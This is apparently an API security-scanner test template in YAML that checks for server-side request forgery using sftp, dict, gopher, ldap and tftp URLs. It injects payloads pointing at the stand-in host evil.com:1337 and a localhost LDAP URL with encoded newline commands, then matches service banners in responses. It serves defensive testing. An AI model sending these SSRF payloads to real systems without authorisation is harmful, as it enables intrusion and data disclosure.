id: SSRF_ON_PROTOCOL_VULNERABILITY
info:
  name: "SSRF Protocol Vulnerability Test"
  description: "This test checks if the API is vulnerable to SSRF attacks using various protocols (SFTP, DICT, GOPHER, LDAP, TFTP)."
  details: >
    "This test aims to identify SSRF vulnerabilities in APIs by attempting to fetch information via different protocols (SFTP, DICT, GOPHER, LDAP, TFTP)." +
    "If the API allows requests with these protocols and returns a response, it may be vulnerable to SSRF attacks."
  impact: "Successful exploitation might lead to unauthorized access or information disclosure."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: SSRF_ON_PROTOCOL_VULNERABILITY
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - https://github.com/akto-api-security/akto/issues/137
    - https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978

api_selection_filters:
  response_code:
    and:
      gte: 200
      lt: 205
  or:
    - request_payload:
        for_one:
          value:
            contains_either:
                - sftp://
          key:
            extract: sftp_key
    - query_param:
        for_one:
          value:
            contains_either:
                - sftp://
          key:
            extract: sftp_key

    - request_payload:
        for_one:
          value:
            contains_either:
                - dict://
          key:
            extract: dict_key
    - query_param:
        for_one:
          value:
            contains_either:
                - dict://
          key:
            extract: dict_key

    - request_payload:
        for_one:
          value:
            contains_either:
                - gopher://
          key:
            extract: gopher_key
    - query_param:
        for_one:
          value:
            contains_either:
                - gopher://
          key:
            extract: gopher_key

    - request_payload:
        for_one:
          value:
            contains_either:
                - ldap://
          key:
            extract: ldap_key
    - query_param:
        for_one:
          value:
            contains_either:
                - ldap://
          key:
            extract: ldap_key

    - request_payload:
        for_one:
          value:
            contains_either:
                - tftp://
          key:
            extract: tftp_key
    - query_param:
        for_one:
          value:
            contains_either:
                - tftp://
          key:
            extract: tftp_key

execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          sftp_key: sftp://evil.com:1337/
      - modify_body_param:
          sftp_key: sftp://evil.com:1337/
          
      - modify_query_param:
          dict_key: dict://evil.com:1337/
      - modify_body_param:
          dict_key: dict://evil.com:1337/
          
      - modify_query_param:
          gopher_key: gopher://evil.com:1337/_Hi%0Assrf%0Atest
      - modify_body_param:
          gopher_key: gopher://evil.com:1337/_Hi%0Assrf%0Atest
          
      - modify_query_param:
          ldap_key: ldap://localhost:1337/%0astats%0aquit
      - modify_body_param:
          ldap_key: ldap://localhost:1337/%0astats%0aquit
          
      - modify_query_param:
          tftp_key: tftp://evil.com:1337/TESTUDPPACKET
      - modify_body_param:
          tftp_key: tftp://evil.com:1337/TESTUDPPACKET

validate:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    contains_either:
      # SFTP
      - "SSH"
      - "OpenSSH"
      # DICT
      - "220"
      - "DICT"
      # GOPHER
      - "Gopher server"
      # LDAP
      - "LDAP"
      # TFTP
      - "TFTP server"
      # Errors
      - "Unable to establish"
      - "Unable to connect"
      - "Unable to access"
  response_headers:
    for_one:
      key:
        eq: Content-Type
      value:
        eq: application/octet-stream
